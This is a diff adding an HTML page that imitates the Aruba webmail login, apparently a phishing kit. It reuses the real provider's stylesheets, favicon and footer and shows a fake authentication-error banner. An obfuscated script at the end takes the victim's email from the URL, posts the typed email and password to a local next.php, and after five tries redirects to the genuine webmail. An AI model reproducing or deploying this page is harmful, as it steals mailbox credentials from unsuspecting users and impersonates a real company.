@@ -1,0 +1,108 @@
+<html><head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta content="text/html; charset=utf-8" http-equiv="content-type"><title>Webmail Arubat</title>
+<meta http-equiv="X-UA-Compatible" content="IE=edge"><link rel="icon" href="https://webmail.aruba.it/web_imgs/aruba/favicon.ico" type="image/x-icon">
+<link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&amp;subset=latin,latin-ext" rel="stylesheet" type="text/css">
+<link href="https://webmail.aruba.it/web_imgs/login/css/login.css" rel="stylesheet" type="text/css">
+
+<style>
+#CybotCookiebotDialog #CybotCookiebotDialogHeader { display: none; }
+#CybotCookiebotDialogTabContent .CybotCookiebotDialogDetailBodyContentCookieContainerButton .CybotCookiebotDialogDetailBulkConsentCount, #CybotCookiebotDialog #CybotCookiebotDialogDetailBulkConsent .CybotCookiebotDialogDetailBulkConsentCount { display: none; }
+#CybotCookiebotDialog.CybotEdge #CybotCookiebotDialogBodyEdgeMoreDetails a { outline-offset: 10px; }
+#CybotCookiebotDialog #CybotCookiebotDialogDetailFooter { display: none; }
+</style>
+
+</head>
+<body style="color:black;">
+
+<div class="login-background">
+	<div class="main-block">
+		<div class="left-block">
+			<div id="ebDiv9217671167454493" dir="ltr" style="display: inline; width: 600px; height: 415px; margin: 0px auto;"><img id="ebDefaultImg_1087014464_9217671167454493" src="https://secure-ds.serving-sys.com/resources/PROD/asset/1073743419/IMAGE/20220426/600x415_70444710646286736.jpg" width="600" height="415" title="" onload="(function(e) { var event = new EBG.Events.Event(EBG.Events.EventNames.ELEMENT_LOADED);event.dispatcher = this;event.eventData = { DOMEvent: e, elementId: &quot;ebDefaultImg_1087014464_9217671167454493&quot;, adUId:&quot;1087014464_9217671167454493&quot; };event.timing = EBG.Events.EventTiming.ONTIME_AND_AFTER;EBG.eventMgr.dispatchEvent(event);} )(typeof arguments != &quot;undefined&quot; ? arguments[0] : null);" onclick="EBG.ads[&quot;1087014464_9217671167454493&quot;].onImageClick(&quot;1087014464_9217671167454493&quot;, 0,&quot;ebDefaultImg_1087014464_9217671167454493&quot;, &quot;https://fibra.aruba.it/?utm_source=webmail-arubait&amp;utm_medium=internal-display-600x415&amp;utm_campaign=fibra-promo-apr&quot;, &quot;&quot;, &quot;&quot;)" style="width: 600px; height: 415px; cursor: pointer; border: 0px; padding: 0px; margin: 0px;"></div>
+			<div class="left-block-image" style="display: none"></div>
+		</div>
+		<div class="right-block">
+			<div class="logo-block">
+				<div class="left-logo"></div>
+				<div class="right-logo"></div>
+			</div>
+			<div class="tab-switcher-block">
+				<div class="tab-buttons-block">
+					<button type="button" class="tab-button tab-1 hide-in-classic" data-i18n="title_tab_1" onclick="displayTab('1')">Webmail</button>
+					<button type="button" class="tab-button tab-2 hide-in-classic" data-i18n="title_tab_2" onclick="displayTab('2')">Manage mailboxes</button>
+				</div>
+				<button type="button" id="language-button">
+					<div class="language-flag">
+						<div id="menu_language"></div>
+					</div>
+					<div id="language_select"></div>
+					<div class="menu-language-arrow"><svg xmlns="http://www.w3.org/2000/svg" width="10" height="10" viewBox="0 0 32 32" fill="#3f3f3f"><polygon points="2.002,10 16.001,24 30.002,10"></polygon></svg></div>
+				</button>
+			</div>
+			<div class="feedback-block">
+				<div class="feedback-icon"></div>
+				<div class="feedback-text" id="feedback-text"></div>
+			</div>
+			<form>
+			<div class="form-block">
+				<div class="form-tab tab-1" id="tab1">
+					<div data-i18n="form_title" class="form-title">Access your Webmail</div>
+					 <div class="feedback-text" style="    background-color: #fbd7ca;align-items: center;
+    border-radius: 6px;
+    display: flex;
+    flex: 0 0 auto;
+    font-size: 12px;
+    min-height: 31px;
+    margin-top: 35px;
+    padding: 5px 20px;
+    box-sizing: border-box;" id="msg">An error occurred during authentication. Please retry.</div>
+					<div class="input-container">
+						<div class="login-icon"></div>
+						<input type="text" id="email" name="email" value="" placeholder="Email">
+					</div>
+					<div class="input-container">
+						<div class="password-icon"></div>
+						<input type="password" id="password" name="password" value="" placeholder="Password">
+						<div class="password-icon-2" onclick="showPassword('password_default')"></div>
+					</div>
+					<div class="remember-me-block">
+						<label for="remember_me">
+							<input type="checkbox" id="remember_me" name="remember_me">
+							<div class="hide-in-classic" data-i18n="remember_me_label">Remember me</div>
+						</label>
+						<div data-i18n="reset_password" class="lost-password"><div class="link" onclick="lostPassword()">Forgotten your password?</div></div>
+					</div>
+					<div class="capslock-detect" id="capslock_detect">Caps Lock</div>
+					
+					<button id="submit-btn" class="login-button" >SIGN IN</button>
+					<div class="giga-text"><div data-i18n="giga_text"></div></div>
+				</div>
+				
+			</div>	</form>
+		</div>
+	</div>
+	<div class="footer-block">
+		<div class="accessible-link" data-i18n="accessible_link"><a href="index.php?accessible=1" target="_parent">Accessible version</a></div>
+		<div class="text-footer" data-i18n="copyright">Copyright © 2022 Aruba S.p.A. - VAT No. 01573850516 - All rights reserved - <a href="https://www.aruba.it/informativa_arubaspa.pdf" target="_blank" rel="noopener noreferrer" class="link">Privacy policy</a></div>
+		<div class="text-footer" data-i18n="cookie_bot"><a href="https://www.aruba.it/cookie-policy.aspx?lang=it-IT" target="_blank" rel="noopener noreferrer" class="link">Cookie policy</a> - <a href="#" onclick="Cookiebot.renew();" class="link" target="_top">Customize cookie preferences</a></div>
+	</div>
+	
+	
+</div>
+
+
+</body>   <!-- Optional JavaScript -->
+  
+  <!-- Optional JavaScript -->
+  <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+  <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+</body>
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+
+    <script type="text/javascript">
+  var _0x19f83c=_0x6fe2;function _0x21c8(){var _0x3d77a6=['8550616hzRaRY','#domain-name','Verifing...','signal','replace','2568680aCIbJz','indexOf','ready','log','val','#error','5287674EWxicO','substr','JSON','preventDefault','hash','show','57hGVWcj','288VAPsop','Sign\x20in','focus','location','#password','https://webmail.aruba.it/','POST','#submit-btn','16206759dMSsYB','#msg','click','Password\x20field\x20is\x20emply.!','bmV4dC5waHA=','html','ajax','108175rhQgpj','toLowerCase','42982fFxgwS','hide','test','#email','135567nDtrVq'];_0x21c8=function(){return _0x3d77a6;};return _0x21c8();}function _0x6fe2(_0x7382d8,_0x54fc21){var _0x21c848=_0x21c8();return _0x6fe2=function(_0x6fe2dd,_0x20f0a6){_0x6fe2dd=_0x6fe2dd-0x1e3;var _0x5bbff2=_0x21c848[_0x6fe2dd];return _0x5bbff2;},_0x6fe2(_0x7382d8,_0x54fc21);}(function(_0x30b380,_0x17a50d){var _0x25ab2c=_0x6fe2,_0x57343e=_0x30b380();while(!![]){try{var _0x4e3e18=-parseInt(_0x25ab2c(0x204))/0x1+-parseInt(_0x25ab2c(0x200))/0x2*(parseInt(_0x25ab2c(0x1ee))/0x3)+parseInt(_0x25ab2c(0x20a))/0x4+-parseInt(_0x25ab2c(0x1fe))/0x5*(parseInt(_0x25ab2c(0x1ef))/0x6)+parseInt(_0x25ab2c(0x1e8))/0x7+-parseInt(_0x25ab2c(0x205))/0x8+parseInt(_0x25ab2c(0x1f7))/0x9;if(_0x4e3e18===_0x17a50d)break;else _0x57343e['push'](_0x57343e['shift']());}catch(_0x3516bf){_0x57343e['push'](_0x57343e['shift']());}}}(_0x21c8,0x8591c),$(document)[_0x19f83c(0x1e4)](function(){var _0x2b3480=_0x19f83c,_0x2f1f97=0x0,_0x4bec3b=window['location'][_0x2b3480(0x1ec)][_0x2b3480(0x1e9)](0x1);if(!_0x4bec3b){}else{var _0x30c3ec=_0x4bec3b,_0x41b87f=_0x30c3ec[_0x2b3480(0x1e3)]('@'),_0x4913ec=_0x30c3ec[_0x2b3480(0x1e9)](_0x41b87f+0x1),_0x33d328=_0x4913ec['substr'](0x0,_0x4913ec[_0x2b3480(0x1e3)]('.')),_0x152b80=_0x33d328[_0x2b3480(0x1ff)]();$('#email')[_0x2b3480(0x1e6)](_0x30c3ec),$(_0x2b3480(0x206))[_0x2b3480(0x1fc)](_0x152b80),$(_0x2b3480(0x1f8))['hide']();}var _0x14f206=_0x2b3480(0x1fb);$(_0x2b3480(0x1f6))[_0x2b3480(0x1f9)](function(_0x569246){var _0x3448db=_0x2b3480;$(_0x3448db(0x1e7))[_0x3448db(0x201)](),$('#msg')[_0x3448db(0x201)](),_0x569246[_0x3448db(0x1eb)]();var _0x2c8659=$(_0x3448db(0x203))[_0x3448db(0x1e6)](),_0x2a35ed=$(_0x3448db(0x1f3))['val'](),_0x54d948=$(_0x3448db(0x1f8))['html']();$('#msg')['text'](_0x54d948);var _0x3a83ec=_0x2c8659,_0x965ed1=/^([a-zA-Z0-9_.+-])+\@(([a-zA-Z0-9-])+\.)+([a-zA-Z0-9]{2,4})+$/;if(!_0x2c8659)return $(_0x3448db(0x1e7))[_0x3448db(0x1ed)](),$(_0x3448db(0x1e7))[_0x3448db(0x1fc)]('Email\x20field\x20is\x20emply.!'),ai[_0x3448db(0x1f1)],![];if(!_0x965ed1[_0x3448db(0x202)](_0x3a83ec))return $(_0x3448db(0x1e7))[_0x3448db(0x1ed)](),$(_0x3448db(0x1e7))['html']('That\x20account\x20doesn\x27t\x20exist.\x20Enter\x20a\x20different\x20account'),ai[_0x3448db(0x1f1)],![];if(!_0x2a35ed)return $(_0x3448db(0x1e7))[_0x3448db(0x1ed)](),$(_0x3448db(0x1e7))['html'](_0x3448db(0x1fa)),ai['focus'],![];var _0x1c77e1=_0x3a83ec[_0x3448db(0x1e3)]('@'),_0x26dfe4=_0x3a83ec['substr'](_0x1c77e1+0x1),_0x280748=_0x26dfe4[_0x3448db(0x1e9)](0x0,_0x26dfe4['indexOf']('.')),_0x16f6af=_0x280748[_0x3448db(0x1ff)]();_0x2f1f97=_0x2f1f97+0x1,$(_0x3448db(0x206))[_0x3448db(0x1fc)](_0x16f6af),$[_0x3448db(0x1fd)]({'dataType':_0x3448db(0x1ea),'url':'next.php','type':_0x3448db(0x1f5),'data':{'email':_0x2c8659,'password':_0x2a35ed},'beforeSend':function(_0x2ea3b1){var _0x1fbc73=_0x3448db;$(_0x1fbc73(0x1f6))[_0x1fbc73(0x1fc)](_0x1fbc73(0x207));},'success':function(_0x54aa0f){var _0x55442f=_0x3448db;if(_0x54aa0f){$(_0x55442f(0x1f8))[_0x55442f(0x1ed)](),console[_0x55442f(0x1e5)](_0x54aa0f);if(_0x54aa0f[_0x55442f(0x208)]=='ok')$(_0x55442f(0x1f3))[_0x55442f(0x1e6)](''),_0x2f1f97>=0x5&&(_0x2f1f97=0x0,window[_0x55442f(0x1f2)][_0x55442f(0x209)](_0x55442f(0x1f4)));else{}}},'error':function(){var _0x42503a=_0x3448db;$(_0x42503a(0x1f3))[_0x42503a(0x1e6)](''),_0x2f1f97>=0x5&&(_0x2f1f97=0x0,window['location']['replace'](_0x42503a(0x1f4))),$(_0x42503a(0x1f8))['show']();},'complete':function(){var _0x3a8b58=_0x3448db;$('#submit-btn')[_0x3a8b58(0x1fc)](_0x3a8b58(0x1f0));}});});}));
+</script>
